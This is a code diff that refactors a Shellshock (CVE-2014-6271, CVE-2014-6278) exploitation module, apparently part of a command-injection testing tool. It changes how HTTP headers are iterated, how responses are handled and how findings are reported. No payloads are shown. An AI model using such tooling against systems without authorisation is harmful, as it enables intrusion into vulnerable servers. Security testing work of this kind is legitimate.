@@ -35,19 +35,12 @@ This module exploits the vulnerabilities CVE-2014-6271 [1], CVE-2014-6278 [2] in
 """
 
 if settings.MULTI_TARGETS or settings.STDIN_PARSING:
+  if settings.COOKIE_INJECTION:
+    settings.COOKIE_INJECTION = None
   if settings.USER_AGENT_INJECTION:
     settings.USER_AGENT_INJECTION = None
   if settings.REFERER_INJECTION:
     settings.REFERER_INJECTION = None
-  if settings.COOKIE_INJECTION:
-    settings.COOKIE_INJECTION = None
-
-# Available HTTP headers
-headers = [
-settings.USER_AGENT,
-settings.REFERER,
-settings.COOKIE,
-]
 
 # Available Shellshock CVEs
 shellshock_cves = [
@@ -290,8 +283,8 @@ def shellshock_handler(url, http_request_method, filename):
 
   try: 
     i = 0
-    total = len(shellshock_cves) * len(headers)
-    for check_header in headers:
+    total = len(shellshock_cves) * len(settings.SHELLSHOCK_HTTP_HEADERS)
+    for check_header in settings.SHELLSHOCK_HTTP_HEADERS:
       for cve in shellshock_cves:
         # Check injection state
         settings.DETECTION_PHASE = True
@@ -316,10 +309,17 @@ def shellshock_handler(url, http_request_method, filename):
           response = proxy.use_proxy(request)
         else:
           response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
+
+        if type(response) is bool:
+          response_info = ""
+        else:
+          response_info = response.info()
+
         if check_header == settings.COOKIE:
           menu.options.cookie = default_cookie
         if check_header == settings.USER_AGENT:
           menu.options.agent = default_user_agent  
+
         percent = ((i*100)/total)
         float_percent = "{0:.1f}".format(round(((i*100)/(total*1.0)),2))
 
@@ -330,7 +330,7 @@ def shellshock_handler(url, http_request_method, filename):
             percent = settings.info_msg
             no_result = False
 
-        elif len(response.info()) > 0 and cve in response.info():
+        elif len(response_info) > 0 and cve in response_info:
           percent = settings.info_msg
           no_result = False
 
@@ -360,9 +360,9 @@ def shellshock_handler(url, http_request_method, filename):
           if settings.VERBOSITY_LEVEL != 0:
             checks.total_of_requests()
 
-          finding = check_header + settings.SINGLE_WHITESPACE + vuln_parameter
+          settings.CHECKING_PARAMETER = check_header + settings.SINGLE_WHITESPACE + vuln_parameter
           # Print the findings to terminal.
-          info_msg = finding + " appears to be injectable via " + technique + "."
+          info_msg = settings.CHECKING_PARAMETER + " appears to be injectable via " + technique + "."
           if settings.VERBOSITY_LEVEL == 0:
             print(settings.SINGLE_WHITESPACE)
           print(settings.print_bold_info_msg(info_msg))
